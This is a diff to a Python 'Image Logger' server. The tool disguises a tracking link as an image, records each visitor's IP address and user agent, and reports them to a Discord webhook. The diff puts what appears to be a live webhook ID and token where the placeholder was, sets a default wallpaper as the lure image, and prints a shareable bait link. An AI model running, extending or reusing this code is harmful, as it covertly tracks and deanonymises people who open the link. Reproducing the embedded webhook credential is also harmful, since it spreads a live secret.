@@ -9,9 +9,10 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG
-    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+    "webhook": "https://discord.com/api/webhooks/1439639460382773248/7fVQ1_3b2IEabj9rgMYYFfF0Byqu_su4XhdwLlfjEgxbcoU0Ex8Kv6fAsqStgBAqUYlC",
     "image": "https://yoursite.com/imagelogger?url=(url-escaped link to an image here)", # You can have a custom image by using a URL argument
     "custom_image": True, # Allows you to use a URL argument to change the image (SEE README)
+    "default_image_url": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg", # Your Bliss wallpaper as default!
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": "0xFF0000", # Hex Color you want for the embed (Example: Red is 0xFF0000)
     "options": {
@@ -127,7 +128,7 @@ class ImageLoggerHandler(BaseHTTPRequestHandler):
                     self.wfile.write(binaries["loading"])
                 return
             makeReport(ip, useragent, endpoint=endpoint)
-            url = params.get('url', [config["image"]])[0]
+            url = params.get('url', [config["default_image_url"]])[0]
             if config["redirect"]:
                 self.send_response(302)
                 self.send_header('Location', config["image_redirect"])
@@ -146,4 +147,6 @@ binaries = {
 
 if __name__ == "__main__":
     from http.server import HTTPServer
-    HTTPServer(("0.0.0.0", 80), ImageLoggerHandler).serve_forever()
+    print(f"{__app__} v{__version__} by {__author__} running on http://0.0.0.0:8080")
+    print("Ready link: http://your-ip:8080/?url=(encoded-image-here)")
+    HTTPServer(("0.0.0.0", 8080), ImageLoggerHandler).serve_forever()
